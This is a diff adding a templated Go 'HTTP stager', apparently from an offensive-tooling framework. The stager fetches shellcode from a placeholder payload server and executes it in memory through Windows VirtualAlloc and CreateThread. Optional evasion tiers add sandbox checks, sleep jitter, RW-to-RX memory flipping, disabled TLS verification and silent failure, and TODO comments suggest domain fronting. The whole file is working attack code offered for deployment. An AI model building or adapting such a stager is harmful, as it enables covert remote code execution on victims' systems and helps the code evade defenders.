@@ -1,0 +1,292 @@
+{{!-- @desc Go HTTP stager — downloads and executes shellcode from URL --}}
+{{!-- @lang go --}}
+{{!-- @arch x86,x64,arm64 --}}
+{{!-- @os windows,linux,macos --}}
+// @desc Go HTTP stager — downloads and executes shellcode from URL
+/*
+ * HTTP Stager Template
+ * ====================
+ * Language: Go
+ * Platform: {{target_os}} {{target_arch}}
+ * Purpose:  Download shellcode from HTTP URL and execute in memory
+ * Evasion:  {{#ifEvasionLevel 2}}{{#ifEvasionLevel 3}}Advanced{{else}}Intermediate{{/ifEvasionLevel}} techniques{{else}}Basic{{/ifEvasionLevel}}
+ *
+ * Build:
+{{#ifOS "windows"}}
+ *   GOOS=windows GOARCH={{#ifArch "x86"}}386{{else}}{{#ifArch "arm64"}}arm64{{else}}amd64{{/ifArch}}{{/ifArch}} go build -ldflags "-s -w" -o {{randomVar}}.exe stager-http.go
+{{else}}{{#ifOS "linux"}}
+ *   GOOS=linux   GOARCH={{#ifArch "x86"}}386{{else}}{{#ifArch "arm64"}}arm64{{else}}amd64{{/ifArch}}{{/ifArch}} go build -ldflags "-s -w" -o {{randomVar}} stager-http.go
+{{else}}
+ *   GOOS=darwin  GOARCH={{#ifArch "arm64"}}arm64{{else}}amd64{{/ifArch}} go build -ldflags "-s -w" -o {{randomVar}} stager-http.go
+{{/ifOS}}{{/ifOS}}
+ *
+ * TODO:
+ * 1. Set SHELLCODE_URL to your payload server
+ * 2. Customize User-Agent and headers
+ * 3. Add domain fronting if needed
+ */
+
+package main
+
+import (
+	"crypto/tls"
+{{#ifEvasionLevel 2}}
+	"crypto/rand"
+	"encoding/hex"
+{{/ifEvasionLevel}}
+	"fmt"
+	"io"
+{{#ifEvasionLevel 3}}
+	"math/rand"
+{{/ifEvasionLevel}}
+	"net/http"
+{{#ifEvasionLevel 2}}
+	"os"
+{{/ifEvasionLevel}}
+	"syscall"
+	"time"
+	"unsafe"
+{{#ifEvasionLevel 3}}
+	"strings"
+{{/ifEvasionLevel}}
+)
+
+// === CONFIGURATION ===
+const (
+	SHELLCODE_URL = "{{#ifEvasionLevel 3}}https://{{randomVar}}.com/{{randomVar}}.bin{{else}}http://CHANGEME.com/payload.bin{{/ifEvasionLevel}}" // TODO: Set your payload URL
+{{#ifEvasionLevel 3}}
+	USER_AGENT    = "{{randomVar}}/{{randomSleep}}.0"
+{{else}}
+	USER_AGENT    = "Mozilla/5.0 ({{#ifOS "windows"}}Windows NT 10.0; Win64; x64{{else}}{{#ifOS "macos"}}Macintosh; Intel Mac OS X 10_15_7{{else}}X11; Linux x86_64{{/ifOS}}{{/ifOS}}) AppleWebKit/537.36"
+{{/ifEvasionLevel}}
+	TIMEOUT       = {{#ifEvasionLevel 2}}{{randomSleep}}{{else}}30{{/ifEvasionLevel}} * time.Second
+{{#ifEvasionLevel 2}}
+	MAX_RETRIES   = 3
+	SLEEP_JITTER  = {{randomSleep}} // milliseconds
+{{/ifEvasionLevel}}
+)
+
+{{#ifOS "windows"}}
+// === WINDOWS API ===
+var (
+	kernel32          = syscall.NewLazyDLL("kernel32.dll")
+	procVirtualAlloc  = kernel32.NewProc("VirtualAlloc")
+	procCreateThread  = kernel32.NewProc("CreateThread")
+	procWaitForSingle = kernel32.NewProc("WaitForSingleObject")
+{{#ifEvasionLevel 2}}
+	procVirtualProtect = kernel32.NewProc("VirtualProtect")
+{{/ifEvasionLevel}}
+)
+
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+{{#ifEvasionLevel 2}}
+	PAGE_READWRITE         = 0x04
+	PAGE_EXECUTE_READ      = 0x20
+{{/ifEvasionLevel}}
+	INFINITE               = 0xFFFFFFFF
+)
+{{/ifOS}}
+
+{{#ifEvasionLevel 2}}
+// === EVASION FUNCTIONS ===
+func randomSleep() {
+	jitter := time.Duration(SLEEP_JITTER + (SLEEP_JITTER / 2)) * time.Millisecond
+	time.Sleep(jitter)
+}
+
+func generateSessionID() string {
+	bytes := make([]byte, 8)
+	rand.Read(bytes)
+	return hex.EncodeToString(bytes)
+}
+
+func checkSandbox() bool {
+	// Basic sandbox detection
+{{#ifOS "windows"}}
+	processes := []string{"vmtoolsd", "vboxservice", "sandboxiedcomlaunch", "wireshark"}
+	// TODO: Implement process enumeration check
+{{else}}
+	artifacts := []string{"/usr/bin/vmware-toolbox", "/usr/bin/VBoxService"}
+	for _, artifact := range artifacts {
+		if _, err := os.Stat(artifact); err == nil {
+			return true
+		}
+	}
+{{/ifOS}}
+	return false
+}
+{{/ifEvasionLevel}}
+
+// === HTTP CLIENT ===
+func createHTTPClient() *http.Client {
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+{{#ifEvasionLevel 2}}
+		DisableKeepAlives: true,
+{{/ifEvasionLevel}}
+	}
+	return &http.Client{
+		Transport: tr,
+		Timeout:   TIMEOUT,
+	}
+}
+
+// === DOWNLOAD SHELLCODE ===
+func downloadShellcode(url string) ([]byte, error) {
+{{#ifEvasionLevel 2}}
+	if checkSandbox() {
+		return nil, fmt.Errorf("sandbox detected")
+	}
+
+	randomSleep()
+{{/ifEvasionLevel}}
+
+	client := createHTTPClient()
+
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	req.Header.Set("User-Agent", USER_AGENT)
+
+{{#ifEvasionLevel 2}}
+	sessionID := generateSessionID()
+	req.Header.Set("X-Session-ID", sessionID)
+{{/ifEvasionLevel}}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
+	}
+
+	return io.ReadAll(resp.Body)
+}
+
+{{#ifOS "windows"}}
+// === EXECUTE SHELLCODE (Windows) ===
+func executeShellcode(shellcode []byte) error {
+	size := len(shellcode)
+
+{{#ifEvasionLevel 2}}
+	// Two-stage allocation to avoid RWX
+	addr, _, err := procVirtualAlloc.Call(
+		0,
+		uintptr(size),
+		MEM_COMMIT|MEM_RESERVE,
+		PAGE_READWRITE,
+	)
+{{else}}
+	// Allocate RWX memory
+	addr, _, err := procVirtualAlloc.Call(
+		0,
+		uintptr(size),
+		MEM_COMMIT|MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE,
+	)
+{{/ifEvasionLevel}}
+
+	if addr == 0 {
+		return fmt.Errorf("VirtualAlloc failed: %v", err)
+	}
+
+	// Copy shellcode to allocated memory
+	for i := 0; i < size; i++ {
+		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]
+	}
+
+{{#ifEvasionLevel 2}}
+	// Change protection to RX
+	var oldProtect uintptr
+	ret, _, err := procVirtualProtect.Call(
+		addr,
+		uintptr(size),
+		PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if ret == 0 {
+		return fmt.Errorf("VirtualProtect failed: %v", err)
+	}
+
+	randomSleep()
+{{/ifEvasionLevel}}
+
+	// Create thread to execute shellcode
+	threadHandle, _, err := procCreateThread.Call(
+		0,
+		0,
+		addr,
+		0,
+		0,
+		0,
+	)
+
+	if threadHandle == 0 {
+		return fmt.Errorf("CreateThread failed: %v", err)
+	}
+
+	// Wait for thread completion
+	procWaitForSingle.Call(threadHandle, INFINITE)
+
+	return nil
+}
+{{else}}
+// === EXECUTE SHELLCODE (Unix) ===
+func executeShellcode(shellcode []byte) error {
+	// Unix implementation would use mmap/mprotect
+	// This is a placeholder for cross-platform compilation
+	return fmt.Errorf("Unix execution not implemented in this template")
+}
+{{/ifOS}}
+
+// === MAIN ===
+func main() {
+{{#ifEvasionLevel 2}}
+	for attempt := 0; attempt < MAX_RETRIES; attempt++ {
+		if attempt > 0 {
+			randomSleep()
+		}
+
+		shellcode, err := downloadShellcode(SHELLCODE_URL)
+		if err != nil {
+			if attempt == MAX_RETRIES-1 {
+				// Fail silently on final attempt
+				return
+			}
+			continue
+		}
+
+		err = executeShellcode(shellcode)
+		if err != nil {
+			if attempt == MAX_RETRIES-1 {
+				// Fail silently on final attempt
+				return
+			}
+			continue
+		}
+
+		// Success - exit
+		return
+	}
+{{else}}
+	shellcode, err := downloadShellcode(SHELLCODE_URL)
+	if err != nil {
+		// Fail silently in real stager
+		return
+	}
+
+	err = executeShellcode(shellcode)
+	if err != nil {
+		// Fail silently in real stager
+		return
+	}
+{{/ifEvasionLevel}}
+}
